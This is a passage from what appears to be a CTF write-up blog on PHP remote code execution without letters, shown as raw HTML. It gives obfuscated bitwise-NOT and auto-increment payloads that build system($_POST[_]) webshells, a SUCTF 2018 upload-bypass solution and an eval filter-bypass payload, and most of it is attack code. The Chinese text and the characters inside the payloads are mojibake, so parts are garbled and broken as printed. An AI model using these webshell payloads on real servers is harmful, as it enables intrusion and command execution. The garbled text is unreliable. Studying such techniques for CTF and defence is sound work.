çš„å¿ƒæµè¿åœ¨æ¨æŸ³å²¸è¾¹é£˜é£å¦‚é£é£æ‰¬æ…¢æ…¢åœ°èµ°è¡Œèµ°åœ¨ä»å®¹çš„å¤œè‰²é‡Œå››å¤„å¼¥æ¼«ç€æ°´èˆ¬çš„æ¸…æ¾ˆä¸åä¸½ä¸æ–‘æ–“å´è®©äººæ„Ÿåˆ°è¶…ç„¶è¿·ç¦»è€Œå¦©åªšé£ä¸­ä¾ç„¶æœ‰æ·¡æ·¡çš„èŠ±é¦™é‚£æ˜¯å­£èŠ‚ç•™ä¸‹çš„ç—•è¿¹æœˆè‰²é‡Œæ ‘å½±å©†å¨‘æš–æš–çš„é£æ‘‡åŠ¨ç€èŠ±æ ‘æ™ƒåŠ¨ç€é»˜å¥‘çš„é¦™æ¸…é›…è€Œæœ¦èƒ§åœ¨æœˆå¤œé‡Œé£æƒ…æ— é™å¤œè‰²æ¾„æ˜é£æ¸…æœˆæœ—æ—–æ—æˆæ°´å¢¨äº‘ç ´æœˆæ¥èŠ±å¼„å½±é£ä¸å®šäººåˆé™æ˜æœˆçº¢åº”æ»¡å¾„æˆ‘ä½åŸç€ä¸çŸ¥ä»é‚£çœ‹æ¥çš„è¯—å¥é™é™çš„æ„Ÿå—æœˆä¸‹æ‚„ç„¶ç»½æ”¾çš„é‚£ä»½æ¸…é›…å‡çœ¸çœ‹æ»¡å¤©æ˜Ÿè¾°ç¢æˆç‚¹ç‚¹çš„æ–‘é©³è½å…¥è¿œå¤„é‚£ä¸ªå°å°çš„è²å¡˜æ˜ ç€ç‚¹ç‚¹çš„æ°´çº¯å‡€è€Œæ‚ é—²ç»†ç¢çš„æœˆå…‰æ´’ä¸‹ä¸€ç»ƒé“¶ç™½æ˜ åœ¨èŠ±é—´åŒ–ä½œæ™¶è¹çš„éœ²æ–‘é©³ç¾ä¸½æˆ‘æ²‰é†‰æ²‰é†‰äºé‚£ä»½ç¼¥ç¼ˆçš„é›…è‡´æ·¡æ·¡è½»ç›ˆä»¿è‹¥çƒŸé›¨çš„å¹½é™ç©ºçµè€Œæ‚ è¿œå¤œå·²æ·±è·¯å¹½æƒ…æ›´æµ“æˆ‘çœ·æ‹çš„çœ‹å‘æ˜æœˆé‚£é‡Œä¸€æœµäº‘çµ®è½»çº±èˆ¬çš„é£˜è¿‡æ‚„æ©äº†æœˆçš„ç¾æ¶©ä¸€æŠ¹å«£ç„¶è½»è½»ç›ˆç›ˆçš„èˆ’å±•é£æŸ”æœˆåœ†å¤œè‰²æ­£é˜‘çŠä»»å‡­æœˆè‰²æ´’è½ç›¸æ€æ»¡åœ°æœˆè‰²é‡Œè®°å¿†ä»¿ä½›ä¹Ÿå˜å¾—é€æ˜åœ¨å¾®é£ä¸­èˆ’å±•ç€è‡ªç”±å¼¥æ¼«ç€æ¸©é¦¨æ¸©å©‰çš„æœˆå…‰è¦†ç›–ç€å¤œçš„æ¸…å†·æ¸…å‡‰çš„é£è‚†æ„çš„å¹è¿‡è®°å¿†çš„çª—æ¢¦ä¸­çš„ç¾ä¸½ç­‰å¾…çš„å“€æ„éƒ½æ²‰æµ¸åœ¨å¤œçš„å¹½é™ä¸­é£ä¸­è¿œè¿œçš„ä¼ æ¥ä¸€å£°å¹æ¯é‚£æ˜¯æ˜æœˆæŠŠè—åœ¨å¿ƒä¸­çš„æ•…äº‹é£˜æ‰¬æˆé£ä¸­ä¸€è‚¡æ¸…é¦™ç»†ç»†ç¢ç¢æµ…æµ…æ·¡æ·¡å€Ÿä¸€ç¼•é£çš„æƒ…æ€€é¥®ä¸€ç›æ¸…ç„¶ç¼¥ç¼ˆå’Œä¸€æ›²äººå€šå­¤æ¥¼å“ä¸€ç§æ·¡ç„¶å¿ƒæƒ…é‚£è½®æœˆä»¿ä½›ä»è¿œå¤çš„å¢¨é¦™é‡Œèµ°æ¥æ¬æ·¡è‹¥æ°´ä¼´ä¸€ç¼•ç»†é£æ‚„ç„¶æ‹¢ä¸Šé£æ‰¬çš„è¡£è§’å’Œç€æœˆéŸµæ‚ æ‚ å°†å¿ƒèå…¥é‚£ä»½æ¬æ·¡æ„Ÿå—é‚£ç§æ€¡è½»è½»çš„å°†æŸ“é¦™çš„å¿ƒäº‹æ”¾é€é™é™çš„ä»»æ€ç»ªè¿·ç¦»åœ¨æµ…å‡‰å¦‚æ¢¦çš„æœˆå¤œè¿œå¤„ä»¿ä½›ä¼ æ¥å­£èŠ‚çš„èŠ±è¯­å¿ƒä¹Ÿå¼€å§‹è†å¬ä¸€å·ä¹¦ç”»åŠç›èŒ¶é¦™ç»†ç¢çš„å½±åƒéšå¹æ¯æ”¾å…¥å¿ƒåº•çè—å‡ ç‰‡èŠ±è½ç—´é†‰äº†çƒŸé›¨æŸ“æ¹¿äº†è½»æ„é¦™æŸ“ä¸€åœ°æœˆåæµæ³„ç‚¹ç‚¹å¾®å…‰äºçª—å¤–æ‘‡æ›³æ—§æ¢¦é¥é¥åœ¨ä¹æœˆçš„å¤œé‡Œå¹è½æ¸…é¦™ä¸€ç¼•è½»è½»çš„éšé£æ½œå…¥çª—å¸·å“€å©‰çš„è‰å£°ç©¿é€æš—å¤œå”±ç€æµ…ç§‹çš„å‡„æ¸…çœ¼ç¥å¾®é»¯å‡çœ¸ä¸€å¸˜çš„å¿ƒäº‹åŒ–ä½œé£é‡Œçš„ä¸€ç¼•å¿§ä¼¤è½å¯çš„å€šç€æ¸…ç±çš„æœˆå…‰ä½è½çš„æ—¶å€™ä¸ºè‡ªå·±ç…®ä¸€å£¶æµ“æµ“çš„å’–å•¡è®©é‚£å¼¥æ¼«çš„é¦™æ°”æ¸æ¸çš„æ©ç›–æˆ‘çš„æƒ†æ€…æ”¾ä¸€æ›²å¿§ä¼¤çš„éŸ³ä¹ä»»å‡­é‚£ç¼•æ—‹å¾‹åœ¨æ— å£°æ¯é—´æ¶¦æ¹¿äº†æˆ‘çš„çœ¼ä¸€ä¸ªäººåœ¨ä¸€æ¯å’–å•¡çš„é¦™æ°”é‡Œé™é™çš„æ€€æƒ³ä½ ä¸ä¼šæ‡‚é‚£ä»½æ¸©æƒ…åœ¨æ²‰å¯‚çš„æ—¥å­é‡Œè®©æˆ‘è¿·ç¦»å¯¹ç€ç ´ç¢çš„æ—¶å…‰å¾®ç¬‘çœ‹æµå¹´é€å»çœ‹ç‚¹ç‚¹çš„æ„ç»ªä¸å¯‚å¯¥ç›¸çŸ¥ç›¸æƒœä¸€å¸˜å¿ƒäº‹åŒ–ä½œé£é‡Œçš„ä¸€ç¼•å¿§ä¼¤åœ¨æ¸©æŸ”çš„æœˆä¸‹è¿·ç¦»è€Œåˆç¼ ç»µå¾®è¹™çš„çœ‰é‡Œå©‰è½¬ç€ç›¸æ€ä¸€å¦‚æ˜¨å¤œæˆ‘åˆåœ¨é™å¤œé‡Œæ‰‹æ§æ˜Ÿå…‰å°†æ€å¿µæ”¾é£æ»¡æ€€çš„å¿ƒæ€åœ¨æ˜Ÿå¤œé‡Œç¼±ç»»æ— è¾¹æ·¡æ·¡çš„æ¸…å¹½éšé˜™é˜™çš„å“€æ„ä»å®¹çš„è½å…¥æˆ‘çš„çœ¸åº•é¡¾ç›¼ä¸­èŠ±å¼€åˆä¸€å­£ä½ çš„æ¸©æƒ…ç©¿è¿‡é¥æœ›çš„å±±æ°´ç¿©ç„¶çš„é£å…¥å°çª—é™ªæˆ‘æµ…åŸä½å”±å¦‚æ°´èˆ¬çš„è½»æŸ”ä½ çš„ç›®å…‰æ‹´ä½äº†æˆ‘çš„ç›¸æ€å°æ‰‹ç‰µä½äº†ä½ ç»™çš„æ¸©æš–ä»æ­¤å¼€å§‹å–œæ¬¢å°±è¿™æ ·å¼€å§‹æ²‰è¿·æœ¬æ˜¯é™Œè·¯å´ä¸æœŸè€Œé‡æœ¬åº”é”™è¿‡å´æ³¨å®šç›¸æƒœç›¸èšçš„æ—¥å­å¤šäº†ä¸€ä»½è´ªæ‹ç›¸ä¼´çš„æ¸©æš–è®©æˆ‘å¿˜è®°äº†æ—©å·²é¢„å®šçš„ç»ˆç‚¹æ•…äº‹æ¯•ç«Ÿæ˜¯æ•…äº‹ç»ˆç©¶æ˜¯è¦è½å¹•é‚£ä»½æˆ‘æ‰€é€‰æ‹©çš„å¹¸ç¦ä¹Ÿåªæ˜¯åœ¨æˆ‘çš„èº«è¾¹ç»•äº†ä¸€ä¸ªåœˆç„¶åèµ°è¿œæ€»æƒ³è®©è‡ªå·±å¦‚èŠ±èˆ¬å¼€åœ¨ä½ çš„çœ¼ä¸­æ€»æƒ³å°†è‡ªå·±çš„è„‰è„‰æŸ”æƒ…æ”¾åœ¨ä½ çš„æ‰‹å¿ƒä½ çš„èº«å½±å´æ€»æ˜¯åœ¨æˆ‘æ³ªçœ¼æ¨¡ç³Šæ—¶åˆæ¸æ¸é£˜è¿œé£ä¸€èˆ¬çš„ä¸ç•™ç—•è¿¹æ¯å¤©ä¸ç›¸æ€ç»“ä¼´è¡Œèµ°å“èŒ—æ—¶é‚£ä»½æ¸…é¦™ä¹Ÿä»¿å¦‚æœ‰ä½ çš„å‘³é“å¸¦æˆ‘é—²æ­¥å°åº­ç”¨ä½ çš„æŸ”æƒ…æ·¡åŒ–äº†æˆ‘çš„æ„ç»ªå½“é›¨è½è½©çª—èŠ±å¼€æ»¡å›­æˆ‘å¹»æƒ³ç€ä¸ä½ è†å¬å¸¦ç€æœŸç›¼å‡çœ¸æœ›å‘ä½ æ¥æ—¶çš„è·¯è§ä¸åˆ°ä½ çš„èº«å½±å”¯æœ‰æ—¶å…‰è¸©ç€ä¼˜é›…çš„è„šæ­¥æ¬¾æ¬¾è€Œæ¥èº«æŠ«æœˆè‰²ç‹¬ç«‹äºæ¸…å†·ä½ çš„èº«å½±é‡å äºæ—‹ç»•çš„é£ä¸­é‚£ä»½å¾®ç¬‘ä¾ç„¶ç•™åœ¨å¼¯å¼¯çš„å˜´è§’å¿ƒå´å†ä¹Ÿæ— æ³•æ·¡å®šå¦‚ç§‹æ°´æ¸…æ³ªæ»´ä¸‹æ—¶æ›¾ç»çš„è¯ºè¨€ä¸€å¦‚éš”ä¸–æŸ”æŸ”çš„æƒ…æ€æ”¾äºå¿ƒåº•é»˜é»˜åœ°æŠŠé‚£ä»½å…³åˆ‡æ•²æˆæ–‡å­—å½“æˆ‘æ— ä¾æ—¶ä½ çš„å¹½é›…ä½ çš„æ·¡ç„¶ä¾ç„¶ä¼šåœ¨æ–‡å­—é‡Œå¸¦æˆ‘çš„æ€ç»ªæ‚ ç„¶æ¢¦çš„è·¯å£æ˜¯å¦å¯ä»¥è®©å¿ƒä¾ç„¶å®ˆå€™ç­‰ä½ é£˜è€Œæ¥å†ç‰µæˆ‘çš„æ‰‹ä¸€è·¯å‰è¡Œä»Šå¤œé‚£ä»½æµ…æµ…çš„å¿§ä¼¤æ³¨å®šææµ…åœ¨æ—§æ¢¦é‡Œ&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="title function_ invoke__">mb_strlen</span>(<span class="variable">$str</span>, <span class="string">&#x27;utf-8&#x27;</span>); <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$str</span>, <span class="variable">$i</span>, <span class="number">1</span>, <span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">    <span class="variable">$b</span> = ~(<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$b</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$payload</span> = <span class="string">&#x27;a&#x27;</span>; <span class="comment">//å•ä¸ªå•ä¸ªå­—ç¬¦è·å–</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$c</span>==<span class="variable">$payload</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$a</span>;<span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line"><span class="variable">$__</span>=[];<span class="variable">$____</span>=<span class="variable">$__</span>==<span class="variable">$__</span>;</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=~(èŒ«)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(å†·)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(èŒ«)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(æ‹¥)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(æš—)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(å’Œ)[<span class="variable">$____</span>];</span><br><span class="line"><span class="comment">#system</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$___</span>=~(æ ¼)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(å¯‚)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(æ°¸)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(æ¬¢)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(ç«Ÿ)[<span class="variable">$____</span>];</span><br><span class="line"><span class="comment">#_POST</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$$___</span>[_]);</span><br><span class="line"><span class="comment">#system($_POST[_]);</span></span><br></pre></td></tr></table></figure><p><strong>ä¸€ä¸ªå°ä¾‹é¢˜</strong></p><h3 id="SUCTF-2018-GetShell-æ— å­—æ¯getshell"><a href="#SUCTF-2018-GetShell-æ— å­—æ¯getshell" class="headerlink" title="[SUCTF 2018]GetShell(æ— å­—æ¯getshell)"></a>[SUCTF 2018]GetShell(æ— å­—æ¯getshell)</h3><p>ç»™äº†ä¸€æ®µä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$contents</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$contents</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_char</span> <span class="keyword">as</span> <span class="variable">$b</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="variable">$b</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ä»ç¬¬å…­ä½å¼€å§‹æ£€æŸ¥æ–‡ä»¶å†…å®¹ï¼Œç„¶åå°†å†…å®¹æ”¾è¿›é»‘åå•é‡Œéå†</p><p>æ–‡ä»¶ä¸Šä¼ æˆåŠŸåå°†æ–‡ä»¶åç¼€æ”¹ä¸º<code>php</code>ï¼Œä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬å³å¯æˆåŠŸ</p><p>fuzzå‘ç°åªå‰©ä¸‹<code>$</code>ã€<code>(</code>ã€<code>)</code>ã€<code>.</code>ã€<code>;</code>ã€<code>=</code>ã€<code>[</code>ã€<code>]</code>ã€<code>_</code>ã€<code>~</code></p><p>å› ä¸ºæ²¡æœ‰æ•°å­—ï¼Œæ‰€ä»¥å…ˆæ„é€ æ•°å­—ä»¥å–ç´¢å¼•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[]; </span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>; </span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>==<span class="variable">$__</span>);<span class="comment">// ä¸ç›¸ç­‰è¿”å›0ï¼Œæ„é€ ç´¢å¼•0</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="variable">$_</span>==<span class="variable">$_</span>);<span class="comment">// ç›¸åŒè¿”å›1ï¼Œæ„é€ ç´¢å¼•1</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line"><span class="variable">$__</span>=[];<span class="variable">$____</span>=<span class="variable">$__</span>==<span class="variable">$__</span>;</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=~(èŒ«)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(å†·)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(èŒ«)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(æ‹¥)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(æš—)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(å’Œ)[<span class="variable">$____</span>];</span><br><span class="line"><span class="comment">#system</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$___</span>=~(æ ¼)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(å¯‚)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(æ°¸)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(æ¬¢)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(ç«Ÿ)[<span class="variable">$____</span>];</span><br><span class="line"><span class="comment">#_POST</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$$___</span>[_]);</span><br><span class="line"><span class="comment">#system($_POST[_]);</span></span><br></pre></td></tr></table></figure><p>æ³¨é‡Šå»æ‰ä¸Šä¼ </p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082245288.png" alt="image-20221008224501227"></p><p>Th1s_14_f14gé‡Œé¢æ˜¯ä¸€ä¸ªé”™è¯¯çš„flag</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082019088.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç¯å¢ƒé—®é¢˜ï¼Œè¯»ç¯å¢ƒå˜é‡<code>env</code>å¯ä»¥è¯»å‡ºæ¥</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082019995.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="phpè‡ªå¢è‡ªå‡getshell"><a href="#phpè‡ªå¢è‡ªå‡getshell" class="headerlink" title="phpè‡ªå¢è‡ªå‡getshell"></a>phpè‡ªå¢è‡ªå‡getshell</h2><p>phpä¸­é€šè¿‡è‡ªå¢è‡ªå‡å¯ä»¥æ„é€ å­—ç¬¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$__</span>;</span><br><span class="line"><span class="comment">//output: B</span></span><br></pre></td></tr></table></figure><p>æ„æ€æ˜¯åªè¦æœ‰ä¸€ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡è‡ªå¢è‡ªå‡æ„é€ å‡ºå…¶ä»–å­—ç¬¦ï¼Œé—®é¢˜å°±è½¬åŒ–ä¸ºäº†æ€ä¹ˆè·å¾—è¿™ä¸€ä¸ªå­—ç¬¦</p><p>phpä¸­å¼ºè¡Œæ‹¼æ¥ä¸¤ä¸ªç©ºæ•°ç»„æˆ–è€…å¼ºè¡Œæ‹¼æ¥å­—ç¬¦ä¸²å’Œæ•°ç»„ä¼šå°†æ•°ç»„å¼ºè¡Œè½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œè¿”å›å­—ç¬¦ä¸²<code>Array</code></p><p>eg.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=[].[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//output:string(10) &quot;ArrayArray&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;&#x27;</span>.[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">//output:string(5) &quot;Array&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Challenge-rce"><a href="#Challenge-rce" class="headerlink" title="Challenge__rce"></a>Challenge__rce</h3><p>3ä¸ªç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.ç©ºæ•°ç»„æ‹¼æ¥æ„é€ å­—æ¯&#x27;A&#x27;</span><br><span class="line">2.å¸Œè…Šå­—æ¯ç¼©å‡å­—ç¬¦é•¿åº¦</span><br><span class="line">3.chr()å‡½æ•°æ„é€ å­—æ¯</span><br></pre></td></tr></table></figure><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$rce</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$rce</span>) &lt;= <span class="number">120</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]/&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$rce</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;Are you hack me?&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;I want string!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;too long!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rce=$_=([].[])[0];++$_;$Î³=++$_;++$_;$Î²=++$_;++$_;$Î¦=++$_;$_=($Î³.++$_.$_=($_.[])[2]);$_=$&#123;_.$Î¦.$Î².$_(84)&#125;;$_[_]($_[1]);</span><br></pre></td></tr></table></figure><p>ç®€å•åˆ†æä¸€ä¸‹</p><p>éš¾ç‚¹æ˜¯åœ¨äºå¯¹å‚æ•°é•¿åº¦çš„é™åˆ¶ï¼Œç”±äºè¿‡æ»¤äº†æ‰€æœ‰å­—æ¯ï¼Œæ‰€ä»¥æ„é€ å‡ºä¸€ä¸ªå¯ç”¨å­—æ¯æ˜¯æ­¤é¢˜çš„å…³é”®</p><p>phpä¸­å¼ºè¡Œæ‹¼æ¥ä¸¤ä¸ªç©ºæ•°ç»„æˆ–è€…å¼ºè¡Œæ‹¼æ¥å­—ç¬¦ä¸²å’Œæ•°ç»„ä¼šå°†æ•°ç»„å¼ºè¡Œè½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œè¿”å›å­—ç¬¦ä¸²<code>Array</code></p><p>eg.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=[].[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//output:string(10) &quot;ArrayArray&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;&#x27;</span>.[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">//output:string(5) &quot;Array&quot;</span></span><br></pre></td></tr></table></figure><p>ç”±äºæ­¤é¢˜è¿‡æ»¤äº†å¼•å·ï¼Œæ‰€ä»¥è¿™é‡Œé€‰æ‹©ç©ºæ•°ç»„æ‹¼ç©ºæ•°ç»„çš„æ–¹å¼</p><p>å› ä¸ºæ•°å­—è¿˜åœ¨æ‰€ä»¥å¯ä»¥å–ç´¢å¼•ï¼Œè¿™æ ·å°±æ‹¿åˆ°äº†å­—æ¯<code>A</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=[].[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//output:string(1) &quot;A&quot;</span></span><br></pre></td></tr></table></figure><p>æœ‰äº†å­—æ¯ï¼Œæ„é€ å°±ç®€å•äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=([].[])[<span class="number">0</span>]; <span class="comment">//A</span></span><br><span class="line">++<span class="variable">$_</span>;</span><br><span class="line">$Î³=++<span class="variable">$_</span>;<span class="title function_ invoke__">var_dump</span>($Î³); <span class="comment">//C</span></span><br><span class="line">++<span class="variable">$_</span>;$Î²=++<span class="variable">$_</span>;<span class="title function_ invoke__">var_dump</span>($Î²); <span class="comment">//E</span></span><br><span class="line">++<span class="variable">$_</span>;$Î¦=++<span class="variable">$_</span>;<span class="title function_ invoke__">var_dump</span>($Î¦); <span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>=($Î³.++<span class="variable">$_</span>.<span class="variable">$_</span>=(<span class="variable">$_</span>.[])[<span class="number">2</span>]);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>); <span class="comment">//CHr</span></span><br><span class="line"><span class="variable">$_</span>=$&#123;_.$Î¦.$Î².<span class="variable">$_</span>(<span class="number">84</span>)&#125;; <span class="comment">//chr(84)=T</span></span><br><span class="line"><span class="variable">$_</span>[_](<span class="variable">$_</span>[<span class="number">1</span>]); <span class="comment">//$_GET[_]($_GET[1]);</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210070002920.png" alt="image-20221007000232847"></p><h3 id="shellme-Revenge"><a 